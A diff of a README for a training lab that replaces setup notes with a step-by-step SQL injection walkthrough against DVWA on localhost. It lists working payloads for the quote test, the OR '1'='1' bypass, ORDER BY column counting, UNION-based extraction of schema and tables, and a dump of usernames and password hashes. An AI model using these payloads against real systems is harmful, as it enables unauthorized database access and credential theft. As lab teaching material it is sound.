@@ -1,104 +1,245 @@
-<p align="center">
-  <img src="https://img.shields.io/badge/Status-Completed-success?style=for-the-badge"/>
-  <img src="https://img.shields.io/badge/Focus-DVWA%20Setup-blue?style=for-the-badge"/>
-  <img src="https://img.shields.io/badge/Level-Beginner--Friendly-orange?style=for-the-badge"/>
-</p>
+# 🔓 SQL Injection – DVWA (Step-by-Step)
 
-# 🧱 DVWA Setup Lab (Linux Web Security Environment)
+## 🎯 Objective
 
-## ⭐ Project Summary
+Exploit SQL Injection in DVWA to:
 
-This repository documents the complete installation and configuration of Damn Vulnerable Web Application (DVWA) on a Linux system.
+1. Bypass logic
+2. Extract database data
+3. Prove impact
+4. (Later) automate with sqlmap
 
-The focus of this project is environment preparation only.
+## 🧱 STEP 0: Pre-Checks (DO THIS ONCE)
 
-No penetration testing or exploitation is performed in this phase.
-
-This lab establishes a clean, reproducible, and controlled environment suitable for future web security testing.
-
-## 🎯 Project Goals
-
-- Build a functional DVWA lab environment
-- Configure Apache, PHP, and MariaDB correctly
-- Ensure DVWA is fully operational
-- Provide terminal-ready documentation for reproducibility
-
-## 🛠️ Technology Stack
-
-| Component | Technology |
-|-----------|-----------|
-| Operating System | Parrot OS (Debian-based Linux) |
-| Web Server | Apache2 |
-| Backend Language | PHP |
-| Database | MariaDB |
-| Application | Damn Vulnerable Web Application (DVWA) |
-
-## 🧪 Lab Architecture
+### 1️⃣ Login to DVWA
 
 ```
-Browser
-   │
-Apache Web Server
-   │
-DVWA (PHP Application)
-   │
-MariaDB Database
+http://localhost/DVWA/login.php
 ```
 
-## 📁 Repository Structure
+- Username: admin
+- Password: password
+
+### 2️⃣ Set Security Level → LOW
+
+- DVWA → Security
+- Set Low
+- Click Submit
+
+✅ SQLi is now intentionally vulnerable
+
+## 🧪 STEP 1: Locate the SQL Injection Point
+
+Go to:
 
 ```
-dvwa-setup-lab/
-│
-├── setup/
-│   └── dvwa-setup-report.md   # Step-by-step terminal commands
-│
-├── screenshots/              # (Optional – add later)
-│
-└── README.md
+DVWA → Vulnerabilities → SQL Injection
 ```
 
-## 🚀 Quick Start
+You'll see:
 
-⚠️ Recommended: Use an isolated VM or local lab environment
+- An input box: User ID
+- A Submit button
 
-```bash
-git clone https://github.com/your-username/dvwa-setup-lab.git
-cd dvwa-setup-lab
+This input is directly used in a SQL query like:
+
+```sql
+SELECT first_name, last_name FROM users WHERE user_id = '$id';
 ```
 
-📄 Follow the complete setup guide here:
+## 💥 STEP 2: Basic SQL Injection Test
 
-➡️ setup/dvwa-setup-report.md
+### 🔹 Payload 1 – Test for SQLi
 
-## ✅ Validation Checklist
+Enter:
 
-- [ ] Apache service running without errors
-- [ ] MariaDB database created and accessible
-- [ ] DVWA configuration file updated
-- [ ] DVWA database initialized successfully
-- [ ] DVWA dashboard accessible via browser
+```sql
+1'
+```
 
-## 🔐 Security Notes
+Click Submit
 
-DVWA is intentionally vulnerable
+### ✅ Expected Result
 
-Must never be exposed to the public internet
+You should see:
 
-Use NAT / Host-only networking
+- SQL error
+- Or broken query behavior
 
-Intended strictly for educational purposes
+🎯 This confirms SQL Injection exists
 
-## 📌 Learning Outcomes
+![Payload 1](screenshots/sql-injection/payload1.png)
 
-- Linux web stack setup
-- PHP application deployment
-- Database configuration
-- Vulnerable lab environment creation
-- Professional technical documentation
+## 🔓 STEP 3: Authentication / Logic Bypass
 
-## 🛣️ Roadmap
+### 🔹 Payload 2 – Always True Condition
 
-- Phase 2: Vulnerability exploitation (SQLi, XSS, Auth)
-- Phase 3: Detection and monitoring
-- Phase 4: Reporting and mitigation
+Enter:
+
+```sql
+1' OR '1'='1
+```
+
+### ✅ Result
+
+- Multiple users returned
+- Not just user ID 1
+
+📌 Impact: Attacker can bypass intended logic
+
+![Payload 2](screenshots/sql-injection/payload2.png)
+
+### 🧠 Why This Works
+
+```sql
+WHERE user_id = '1' OR '1'='1'
+```
+
+Since `'1'='1'` is always true → database returns all rows
+
+## 🧨 STEP 4: Identify Number of Columns (CRITICAL)
+
+We need this for UNION attacks.
+
+### 🔹 Payload 3 – ORDER BY
+
+Try one by one:
+
+```sql
+1' ORDER BY 1-- -
+```
+
+![Payload 3.1](screenshots/sql-injection/payload31.png)
+
+```sql
+1' ORDER BY 2-- -
+```
+
+![Payload 3.2](screenshots/sql-injection/payload32.png)
+
+```sql
+1' ORDER BY 3-- -
+```
+
+![Payload 3.3](screenshots/sql-injection/payload33.png)
+
+❌ When it breaks → too many columns
+
+### ✅ DVWA Result
+
+Usually:
+
+- ORDER BY 2 → works
+- ORDER BY 3 → error
+
+👉 Number of columns = 2
+
+## 🧬 STEP 5: UNION-Based SQL Injection (DATA EXTRACTION)
+
+### 🔹 Payload 4 – UNION Test
+
+```sql
+1' UNION SELECT 1,2-- -
+```
+
+### ✅ Expected Output
+
+You should see:
+
+```
+First name: 1
+Surname: 2
+```
+
+🎯 This confirms:
+
+- UNION injection works
+- You control output columns
+
+![Payload 4](screenshots/sql-injection/payload4.png)
+
+## 🗃️ STEP 6: Extract Database Name
+
+### 🔹 Payload 5
+
+```sql
+1' UNION SELECT database(),user()-- -
+```
+
+### ✅ Output Example
+
+```
+dvwa@localhost
+```
+
+📌 Impact: DB fingerprinting
+
+![Payload 5](screenshots/sql-injection/payload5.png)
+
+## 📂 STEP 7: Extract Table Names
+
+### 🔹 Payload 6
+
+```sql
+1' UNION SELECT table_name, null 
+FROM information_schema.tables 
+WHERE table_schema='dvwa'-- -
+```
+
+### ✅ Expected Tables
+
+- users
+- guestbook
+
+![Payload 6](screenshots/sql-injection/payload6.png)
+
+## 🔑 STEP 8: Extract Column Names (users table)
+
+### 🔹 Payload 7
+
+```sql
+1' UNION SELECT column_name, null 
+FROM information_schema.columns 
+WHERE table_name='users'-- -
+```
+
+### ✅ Columns
+
+- user
+- password
+- first_name
+- last_name
+
+![Payload 7](screenshots/sql-injection/payload7.png)
+
+## 🔐 STEP 9: Dump Usernames & Password Hashes
+
+### 🔹 Payload 8 (IMPORTANT)
+
+```sql
+1' UNION SELECT user, password FROM users-- -
+```
+
+### ✅ Output
+
+You'll see:
+
+- Usernames
+- MD5 password hashes
+
+Example:
+
+```
+admin | 5f4dcc3b5aa765d61d8327deb882cf99
+```
+
+👉 That hash = password
+
+![Payload 8](screenshots/sql-injection/payload8.png)
+
+## 🎯 IMPACT SUMMARY
+
+| 🔴 Vulnerability | SQL Injection (OWASP A03) |
+|------------------|---------------------------|
+| 🔴 Impact | Unauthorized data access<br>Credential disclosure<br>Full database compromise |
+| 🔴 Risk | Critical |
